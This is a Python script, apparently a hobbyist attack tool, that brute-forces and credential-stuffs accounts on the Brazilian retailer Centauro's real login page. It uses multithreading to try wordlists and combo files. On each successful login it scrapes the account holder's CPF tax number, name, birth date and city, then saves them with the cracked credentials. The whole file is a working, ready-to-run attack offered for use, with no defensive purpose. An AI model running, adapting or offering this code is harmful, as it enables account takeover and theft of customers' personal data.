# -*- coding: utf-8 -*-

import sys
import os.path
import re
from optparse import OptionParser
from threading import Thread
from time import sleep

try:
    import requests
    from requests.exceptions import ConnectionError
except ImportError as error:
    exit('\t[-] Import error: %s' % error.message.split(' ')[-1])


BANNER = u'''
\t\t\t\bGreets from ThePythonBoatBrazil
\t+-----------------+---------------------------+ +-----------------+
\t|     Author      |           Title           | |     Friends     |
\t+-----------------+---------------------------+ +-----------------+
\t| João (d3z3n0v3) | Centauro Store bruteforce | | Tropa do Cenora |
\t+-----------------+---------------------------+ +-----------------+'''

LIVES = []

OUTPUT = []

ARGS = None

CHECKED_PASSWORDS = []


def catch(arg_message, arg_exit):
    if arg_exit:
        exit('\t[-] ' + arg_message)
    else:
        print '\t[-] ' + arg_message


def account_status(arg_email, arg_password):
    status = {}
    data = {'Login': arg_email,
            'Senha': arg_password,
            'Cadastro': 'false'}
    request = requests.post('https://www.centauro.com.br/slogin?ReturnUrl=%2fminha-conta%2fcadastro', data=data, timeout=5)

    if request.url == 'https://www.centauro.com.br/minha-conta/cadastro':
        status['live'] = True
        if ARGS.all:
            cpf = re.findall(r'<input(?:.*?)id=\"fisica-cpf\"(?:.*)value=\"([^\"]+).*>', request.text)[0]
            nome = re.findall(r'<input(?:.*?)id=\"fisica-nome\"(?:.*)value=\"([^\"]+).*>', request.text)[0] + ' ' + \
                   re.findall(r'<input(?:.*?)id=\"fisica-sobrenome\"(?:.*)value=\"([^\"]+).*>', request.text)[0]
            data = re.findall(r'<input(?:.*?)id=\"fisica-data-de-nascimento\"(?:.*)value=\"([^\"]+).*>', request.text)[0]
            cidade = re.findall(r'<input(?:.*?)id=\"fisica-cidade\"(?:.*)value=\"([^\"]+).*>', request.text)[0]
            status['cpf'] = cpf
            status['name'] = nome
            status['date'] = data
            status['city'] = cidade
    else:
        status['live'] = False

    return status


def worker(arg_email, arg_password):
    sys.stdout.write(u'\t[+] Bruteforcing account (email="{}", password="{}")...\t\t\t\r'.format(arg_email, arg_password))
    sys.stdout.flush()
    status = account_status(arg_email, arg_password)
    if status['live']:
        LIVES.append(u'\t[+] Bruteforced successfully (email="{}", password="{}")!'.format(arg_email, arg_password) if
                     not ARGS.all else u'\t[+] Bruteforced '
                     u'successfully (email="{}", password="{}", name="{}",\n\t\t\t\tcpf="{}", '
                     u'date="{}", city="{}")!\t\t\t\r'.format(arg_email, arg_password, status['name'], status['cpf'],
                                                              status['date'], status['city']))
        sys.stdout.write(u'\t[+] Bruteforced successfully (email="{}", '
                         u'password="{}")!\t\t\t\r'.format(arg_email, arg_password) if
                         not ARGS.all else u'\t[+] Bruteforced '
                         u'successfully (email="{}", password="{}", name="{}",\n\t\t\t\tcpf="{}", '
                         u'date="{}", city="{}")!\t\t\t\r'.format(arg_email, arg_password, status['name'], status['cpf'],
                                                              status['date'], status['city']))
        sys.stdout.flush()
    else:
        CHECKED_PASSWORDS.append(arg_password)


def main(arg_args):
    if arg_args.email != '':
        if arg_args.password != '':
            worker(arg_args.email, arg_args.password)

        elif arg_args.password_file != '' and os.path.isfile(arg_args.password_file):
            threads = []
            passwords = [l.strip() for l in open(arg_args.password_file, 'r').readlines()]

            for l in passwords:
                thread = Thread(target=worker, args=(arg_args.email, l,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
                sleep(arg_args.sleep)

            for thread in threads:
                thread.join()

    elif arg_args.email_file != '' and os.path.isfile(arg_args.email_file):
        if arg_args.password != '':
            threads = []
            emails = [l.strip() for l in open(arg_args.email_file, 'r').readlines()]

            for l in emails:
                thread = Thread(target=worker, args=(l, arg_args.password,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
                sleep(arg_args.sleep)
            for thread in threads:
                thread.join()

        elif arg_args.password_file != '' and os.path.isfile(arg_args.password_file):
            threads = []
            emails = [l.strip() for l in open(arg_args.email_file, 'r').readlines()]
            passwords = [l.strip() for l in open(arg_args.password_file, 'r').readlines()]

            for l in passwords:
                for l2 in emails:
                    thread = Thread(target=worker, args=(l, l2,))
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)
                    sleep(arg_args.sleep)

            for thread in threads:
                thread.join()

    if arg_args.db_file != '' and os.path.isfile(arg_args.db_file):
        threads = []
        lines = [l.strip() for l in open(arg_args.db_file, 'r').readlines()]

        for l in lines:
            email, password = l.split(arg_args.delimiter)
            thread = Thread(target=worker, args=(email, password,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            sleep(arg_args.sleep)

        for thread in threads:
            thread.join()


if __name__ == '__main__':
    parser = OptionParser(u'''{}

\t[+] Centauro Store Session Hijacking / Scraping exploit.
\t[+] Use '-h' for view the commands.'''.format(BANNER))
    parser.add_option('-e', dest='email', type='string', help='Email', action='store', default='')
    parser.add_option('-p', dest='password', type='string', help='Password', action='store', default='')
    parser.add_option('-E', dest='email_file', type='string', help='Email file', action='store', default='')
    parser.add_option('-P', dest='password_file', type='string', help='Password file', action='store', default='')
    parser.add_option('-D', dest='db_file', type='string', help='Database file', action='store', default='')
    parser.add_option('-d', dest='delimiter', type='string', help='Delimiter for db file', action='store', default=':')
    parser.add_option('-o', dest='output', type='string', help='Output file', action='store', default='output.txt')
    parser.add_option('-s', dest='sleep', type='float', help='Timeout for multithreading', action='store', default=1)
    parser.add_option('-a', dest='all', help='Scrap all informations', action='store_true')
    (args, _) = parser.parse_args()

    ARGS = args

    if ((args.email == '' and args.email_file == '') or (args.password == '' and
       args.password_file == '')) and args.db_file == '':
        exit(parser.usage)
    print BANNER
    print
    print '\t[+] The bruteforce has been started!\n'

    main(args)

    if len(LIVES) > 0:
        print '\n'
        print '\t[+] {} passwords checked!\n'.format(str(len(CHECKED_PASSWORDS)))
        print '\t[+] Bruteforced accounts (size="{}")!\n'.format(str(len(LIVES)))
        for line in LIVES:
            print line
        print '\n\t[+] All bruteforced accounts has been saved (file="{}")!'.format(args.output)
        OUTPUT = [line.strip('\t') for line in LIVES]
        with open(args.output, 'a') as f:
            f.write('\n'.join([line for line in OUTPUT]))
            if len(LIVES) > 1:
                f.write('\n')
    else:
        print '\n'
        print '\t[+] {} passwords checked!'.format(str(len(CHECKED_PASSWORDS)))
